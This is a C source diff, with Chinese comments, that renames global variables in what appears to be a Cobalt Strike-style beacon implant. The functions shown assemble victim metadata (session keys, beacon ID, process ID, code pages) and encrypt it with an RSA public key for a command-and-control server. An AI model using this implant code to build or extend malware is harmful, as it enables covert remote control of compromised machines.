@@ -7,9 +7,9 @@
 #include "Api.h"
 #include "Process.h"
 
-extern unsigned char aeskey[16];
-extern unsigned char hmackey[16];
-extern int clientID;
+extern unsigned char g_aeskey[16];
+extern unsigned char g_hmackey[16];
+extern int g_client_id;
 
 MakeMetaInfoResult MakeMetaInfo() {
     MakeMetaInfoResult nullResult = { NULL, 0 };
@@ -30,9 +30,9 @@ MakeMetaInfoResult MakeMetaInfo() {
     }
 
     // 前16字节为 AES 密钥
-    memcpy(aeskey, hash, 16);
+    memcpy(g_aeskey, hash, 16);
     // 后16字节为 HMAC 密钥 
-    memcpy(hmackey, hash + 16, 16);
+    memcpy(g_hmackey, hash + 16, 16);
 
     // 获取当前系统的 ANSI 代码页
     short acp = GetACP();
@@ -41,7 +41,7 @@ MakeMetaInfoResult MakeMetaInfo() {
     short oemcp = GetOEMCP();
 
     // 随机生成一个 6 位偶数为BeaconId
-    clientID = GenerateRandomInt(100000, 999998);
+    g_client_id = GenerateRandomInt(100000, 999998);
 
     // PID
     uint32_t pid = GetCurrentProcessId();
@@ -103,10 +103,10 @@ MakeMetaInfoResult MakeMetaInfo() {
     // oemcp
     BeaconFormatAppend(&format, &oemcp, 2);
     // Beacon id
-    BeaconFormatInt(&format, clientID);
+    BeaconFormatInt(&format, g_client_id);
     // pid
     BeaconFormatInt(&format, pid);
-    // port ssh session
+    // g_port ssh session
     BeaconFormatShort(&format, 0);
     // flag
     BeaconFormatChar(&format, flags);
@@ -203,7 +203,7 @@ EncryptMetadataResult EncryMetadata()
     unsigned char* pEncrypted = NULL;
 
     // 获取并导入 PEM 公钥
-    if (!PemToCNG(pub_key_str, &hKey) || !hKey) {
+    if (!PemToCNG(g_public_key_str, &hKey) || !hKey) {
         fprintf(stderr, "Importing PEM public key failed\n");
         goto cleanup;
     }
